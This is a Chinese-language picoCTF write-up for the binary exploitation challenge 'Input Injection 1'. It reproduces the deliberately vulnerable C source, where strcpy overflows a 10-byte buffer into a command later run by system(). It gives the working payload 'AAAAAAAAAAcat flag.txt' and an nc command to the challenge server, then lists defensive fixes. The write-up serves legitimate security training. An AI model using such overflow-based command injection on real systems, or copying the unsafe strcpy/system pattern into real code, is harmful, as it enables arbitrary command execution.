## Challenge Metadata

- **Platform:** picoCTF
- **Category:** Binary Exploitation
- **Difficulty:** Medium
- **Author:** Bryan
- **Date:** 2026-3-14

### 一、基本資訊

**題目名稱：** Input Injection 1  
**題目類型：** Binary Exploitation  
**平台：** picoCTF  
**目標：** 利用程式中的輸入處理漏洞，使程式執行攻擊者指定的系統指令並取得 flag

### 二、題目概述

本題提供一個可執行檔 `vuln` 以及其對應的原始碼 `vuln.c`。程式會詢問使用者名稱，並在輸出告別訊息後執行一個系統指令。

表面上程式的功能只是：

- 接收使用者輸入的名稱
- 顯示告別訊息
- 執行 `uname` 指令

然而在程式內部的字串處理過程中，開發者使用了不安全的函式 `strcpy()`，且未對輸入長度進行檢查，導致攻擊者可以透過 Buffer Overflow 覆蓋程式中的其他變數。

透過此漏洞，攻擊者可以修改原本應執行的指令內容，使程式改為執行 `cat flag.txt` 等指令，最終取得 flag。

### 三、分析目標

本次分析的主要目標如下：

- 分析程式的執行流程
- 找出輸入處理中的安全弱點
- 說明漏洞形成原因
- 設計 exploit payload
- 成功取得 flag

### 四、靜態分析

題目提供的原始碼如下：

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

void fun(char *name, char *cmd);

int main() {
    char name[200];
    printf("What is your name?\n");
    fflush(stdout);

    fgets(name, sizeof(name), stdin);
    name[strcspn(name, "\n")] = 0;

    fun(name, "uname");
    return 0;
}

void fun(char *name, char *cmd) {
    char c[10];
    char buffer[10];

    strcpy(c, cmd);
    strcpy(buffer, name);

    printf("Goodbye, %s!\n", buffer);
    fflush(stdout);
    system(c);
}
```

程式流程如下：

1. 使用者輸入 `name`  
2. 呼叫 `fun(name, "uname")`  
3. 複製 `name` → `buffer`；複製 `cmd` → `c`  
4. 輸出 Goodbye  
5. `system(c)`

在正常情況下，`system(c)` 會執行：

```
uname
```

輸出系統資訊。

### 五、弱點判定

#### 5.1 弱點描述

在 `fun()` 函式中：

```c
char buffer[10];
strcpy(buffer, name);
```

`buffer` 只有 10 bytes，但 `name` 最多可輸入 200 bytes。

由於 `strcpy()` 不會檢查長度，當輸入長度超過 10 bytes 時，就會造成 Buffer Overflow。

更重要的是，在 stack 上 `buffer` 後面還有另一個變數：

```c
char c[10];
```

這個變數儲存了系統要執行的指令。

因此 overflow 會覆蓋 `c` 的內容。

#### 5.2 弱點類型

- Stack Buffer Overflow
- Input Injection
- Unsafe String Handling

#### 5.3 風險說明

由於程式最後會執行：

```c
system(c);
```

如果攻擊者可以覆蓋 `c` 的內容，就可以讓程式執行任意 shell 指令。

例如：

```
cat flag.txt
```

如此即可直接讀出 flag。

### 六、攻擊思路

原始執行流程：

```c
system("uname")
```

攻擊目標：

```c
system("cat flag.txt")
```

Stack memory 可能排列如下：

```
buffer[10]
c[10]
```

當輸入長度超過 10 bytes 時：

```
AAAAAAAAAAcat flag.txt
```

memory 會變成：

```
buffer = AAAAAAAAAA
c = cat flag.txt
```

最後程式執行：

```c
system("cat flag.txt")
```

### 七、利用過程

#### 7.1 連線到遠端挑戰

```sh
nc amiable-citadel.picoctf.net 58136
```

程式會詢問名稱：

```
What is your name?
```

#### 7.2 輸入 exploit payload

輸入：

```
AAAAAAAAAAcat flag.txt
```

payload 結構：

```
[10 bytes padding] + [command]
```

#### 7.3 程式執行流程

程式執行：

```c
strcpy(buffer, name)
```

導致 overflow：

```
buffer → AAAAAAAAAA
c → cat flag.txt
```

最後：

```c
system(c)
```

等同於：

```c
system("cat flag.txt")
```
## 八、利用結果

成功取得 flag

（實際 flag 依遠端環境為準）

## 九、完整 exploit payload
AAAAAAAAAAcat flag.txt

遠端利用：

nc amiable-citadel.picoctf.net 58136

輸入 payload 即可取得 flag。

## 十、成因分析

漏洞產生的主要原因如下：

#### 10.1 使用不安全的字串函式

程式使用：

strcpy()

該函式不會檢查目標 buffer 長度。

#### 10.2 缺乏輸入長度限制

輸入長度：

200 bytes

但目標 buffer：

10 bytes
#### 10.3 敏感操作依賴可被覆蓋的變數

程式將系統指令存於 stack 變數：

char c[10]

攻擊者可以透過 overflow 覆蓋此變數。

## 十一、防禦建議

為避免此類漏洞，可採取以下措施：

#### 11.1 使用安全函式

避免使用：

strcpy()

改用：

strncpy()

或其他安全 API。

#### 11.2 驗證輸入長度

應限制輸入大小：

strlen(name) < buffer_size
#### 11.3 避免直接使用 system()

若需要執行系統指令，應使用更安全的方式，例如：

execve()

並避免透過字串拼接生成指令。

#### 11.4 啟用記憶體保護機制

例如：

Stack Canary

ASLR

NX

這些機制可降低 overflow 攻擊成功率。

## 十二、結論

本題展示了一個典型的 Stack Buffer Overflow 漏洞。由於程式使用 strcpy() 將使用者輸入複製到過小的 buffer 中，攻擊者可以覆蓋 stack 上的其他變數。

在本案例中，攻擊者成功覆蓋了儲存系統指令的變數 c，使原本應執行的 uname 被替換為 cat flag.txt，最終取得 flag。

此案例說明，在系統程式設計中，不安全的字串處理函式與缺乏輸入驗證會造成嚴重的安全風險。

## 十三、附錄：關鍵觀念整理

| 項目 | 說明 |
| --- | --- |
| 弱點名稱 | Stack Buffer Overflow |
| 弱點位置 | strcpy(buffer, name) |
| 可控制變數 | c |
| 攻擊方式 | Overflow 覆蓋 system() 指令 |
| 攻擊效果 | 任意指令執行 |
| Exploit Payload | AAAAAAAAAAcat flag.txt |

## 使用工具

- nc
- gcc
- gdb
- Linux shell